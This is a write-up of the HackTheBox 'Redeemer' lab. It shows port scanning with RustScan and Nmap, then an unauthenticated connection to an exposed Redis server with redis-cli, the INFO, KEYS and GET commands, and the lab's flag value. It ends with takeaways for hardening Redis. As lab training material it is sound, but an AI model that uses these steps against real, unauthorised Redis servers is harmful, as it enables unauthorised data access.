# Redeemer

This is a HackTheBox Starting Point lab for practicing Redis service enumeration, unauthenticated database access testing, and key-value data retrieval.

## Reconnaissance

Started with **RustScan** and **Nmap** to identify open ports and services on the target.

```bash
rustscan -a $target --ulimit 5000 -- -sV -sC
```

The scan identified one open port:

```text
6379/tcp open  redis  Redis key-value store 5.0.7
```

This showed that Redis was exposed directly over the network.

---

## Redis Access

Connected to the Redis service using `redis-cli`:

```bash
redis-cli -h $target
```

The connection succeeded without authentication:

```text
10.129.123.217:6379>
```

Ran the `INFO` command to inspect server details:

```text
10.129.123.217:6379> info
```

Important details:

```text
redis_version:5.0.7
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
tcp_port:6379
config_file:/etc/redis/redis.conf
```

The keyspace section showed that database `0` contained four keys:

```text
db0:keys=4,expires=0,avg_ttl=0
```

---

## Key Enumeration

Selected database `0`:

```text
10.129.123.217:6379> select 0
OK
```

Listed all keys:

```text
10.129.123.217:6379> keys *
```

Result:

```text
1) "numb"
2) "temp"
3) "stor"
4) "flag"
```

The `flag` key looked like the most relevant value to inspect.

---

## Flag Retrieval

Read the `flag` key:

```text
10.129.123.217:6379> get flag
```

Result:

```text
"03e1d2b376c37ab3f5319922053953eb"
```

Flag:

```text
03e1d2b376c37ab3f5319922053953eb
```

---

## Attack Path

```text
RustScan / Nmap
        ↓
Redis Service Discovery
        ↓
Unauthenticated redis-cli Connection
        ↓
Server Information Review
        ↓
Database 0 Selection
        ↓
Key Enumeration
        ↓
flag Key Retrieval
```

## Key Takeaways

* Redis should not be exposed directly to untrusted networks.
* Unauthenticated Redis access can allow attackers to enumerate and retrieve stored data.
* The `INFO` command can reveal useful server, OS, configuration, and keyspace details.
* Basic Redis commands such as `SELECT`, `KEYS`, and `GET` are enough to retrieve sensitive values when authentication is missing.
* Redis deployments should enforce authentication, network restrictions, and least-privilege access.
